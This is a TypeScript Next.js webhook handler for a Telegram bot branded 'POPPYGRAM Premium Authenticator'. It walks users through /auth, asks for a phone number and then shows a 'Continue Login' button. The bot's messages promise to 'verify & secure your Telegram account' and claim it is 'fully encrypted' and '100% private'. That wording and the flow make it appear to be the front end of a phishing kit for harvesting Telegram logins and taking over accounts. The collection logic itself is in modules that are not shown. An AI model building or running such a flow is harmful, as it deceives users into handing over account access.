import {db} from '../../lib/db';
// Telegram bot webhook. Receives updates from Telegram (POST) and answers the
// user in the chat. The whole-site pass gate lets /api/bot through; this handler
// authenticates the caller via the webhook secret token (X-Telegram-Bot-Api-Secure-Token).
import type {NextApiRequest,NextApiResponse} from 'next';
import {botToken,sendMessage,getMe,F,escapeHtml} from '../../lib/bot';
import {startAuth,handlePhone,clearState,getStateSafe} from '../../lib/botFlow';

// ── Premium message templates (HTML parse_mode + luxury unicode font) ──
const DIV='✦ ━━━━━━━━━━━━━ ✦';

const GREETING=`✨ <b>${F('Welcome to POPPYGRAM')}</b> ✨
🛡️ <i>${F('Premium Authenticator')}</i> 💎
👑 <i>by ${F('YourPOPPY41')}</i>

${DIV}

🔐 ${F('Verify & secure your Telegram account')}
⚡ ${F('Blazing fast')}  •  🔒 ${F('Fully encrypted')}  •  💎 ${F('100% private')}

${DIV}

👇 ${F('Tap below to begin your journey:')}

🚀 /auth <i>— ${F('send this command to verify your account')}</i>`;

const HELP=`📖 <b>${F('COMMAND MENU')}</b> 📖

${DIV}

🚀 /start <i>— ${F('About this bot')}</i>
🔐 /auth <i>— ${F('Add your Telegram account')}</i>
🚫 /cancel <i>— ${F('Cancel current process')}</i>
💎 /help <i>— ${F('Show this premium menu')}</i>

${DIV}

⚠️ <i>${F('Only one verification at a time')}</i> ⏳`;

function commandPath(text:string){
  const t=(text||'').trim();
  const sp=t.indexOf(' ');
  return sp>0?t.slice(0,sp):t;
}

async function handleMessage(chatId:number,text:string):Promise<{text:string;url?:string}>{
  const cmd=commandPath(text);
  if(cmd==='/start')return {text:GREETING,url:'auth'};
  if(cmd==='/help')return {text:HELP};
  if(cmd==='/cancel'){await clearState(chatId);return {text:`🚫 <b>${F('Process Cancelled')}</b>\n\n<i>${F('Your session has been safely closed.')}</i> 🛡️\n\n${DIV}\n\n👇 ${F('Start fresh anytime with')} /auth ✨`};}
  if(cmd==='/auth')return {text:await startAuth(chatId)};
  if(cmd.startsWith('/'))return {text:`❓ <b>${F('Unknown Command')}</b> ❓\n\n<i>${F('That magic spell is not in my book.')}</i> 📖\n\n💎 ${F('See all commands:')} /help ✨`};

  // No command -> an answer for the active flow (phone or link)
  const st=await getStateSafe(chatId);
  if(st&&st.step==='phone')return await handlePhone(chatId,text);
  if(st&&st.step==='link')return {text:`👆 <b>${F('Almost There')}</b> 👆\n\n<i>${F('Tap the button below to finish')}</i> ✨\n\n🚫 ${F('Changed your mind? Send')} /cancel`};
  return {text:`👋 <b>${F('Hey There')}</b> 👋\n\n🚀 ${F('Send')} /auth <i>${F('to begin')}</i> ✨\n💎 /help <i>${F('for all commands')}</i>`};
}

export default async function h(req:NextApiRequest,res:NextApiResponse){
  if(req.method!=='POST')return res.status(405).json({error:'Method not allowed'});

  // Authenticate the caller: Telegram sends X-Telegram-Bot-Api-Secret-Token when
  // the webhook was registered with a secret_token. Reject everything that lacks it.
  // FIX #8: Fail-closed — if TG_BOT_WEBHOOK_SECRET is not set, reject all POSTs.
  const secret=process.env.TG_BOT_WEBHOOK_SECRET||'';
  if(!secret)return res.status(500).json({error:'TG_BOT_WEBHOOK_SECRET not configured'});
  const hdr=req.headers['x-telegram-bot-api-secret-token']||'';
  if(!hdr||hdr!==secret)return res.status(403).json({error:'Forbidden'});

  const update=req.body;
  if(!update||!update.update_id)return res.status(200).json({ok:true});

  // Idempotency: Telegram may retry a webhook update. Store update_id behind a unique key.
  const {error:idError}=await db.from('processed_updates').insert({update_id:Number(update.update_id)});
  if(idError){
    // Duplicate update_id means Telegram retried a request we already processed.
    if((idError as any).code==='23505')return res.status(200).json({ok:true,duplicate:true});
    console.error('[webhook idempotency]',idError);
  }

  const msg=update.message;
  if(!msg||!msg.chat||!msg.chat.id||typeof msg.text!=='string'){
    return res.status(200).json({ok:true}); // ignore non-text updates
  }

  const chatId=msg.chat.id;

    // Return 200 to Telegram immediately, then process the reply async.
  // NOTE: awaiting the reply before this return keeps the function alive
  // on Vercel; the response completes as soon as the handler returns.
  try{
    const reply=await handleMessage(chatId,String(msg.text));
    if(reply.url&&reply.url!=='auth')await sendMessage(chatId,reply.text,{buttons:[[{text:'✨ Continue Login ▸ ✨',url:reply.url}]]});
    else await sendMessage(chatId,reply.text);
  }catch(e:any){
    try{
      const m=String(e?.message||e?.errorMessage||'');
      if(m.includes('TG_BOT_TOKEN is not set'))await sendMessage(chatId,`⚠️ <b>${F('Bot Offline')}</b> ⚠️\n\n<i>${F('Not fully configured yet. Please try again later.')}</i> 🔧`);
      else await sendMessage(chatId,`❌ <b>${F('Something Went Wrong')}</b> ❌\n\n<i>${escapeHtml(m.slice(0,200))||F('Please try again')}</i> 🔄`);
    }catch{}
  }
  return res.status(200).json({ok:true});
}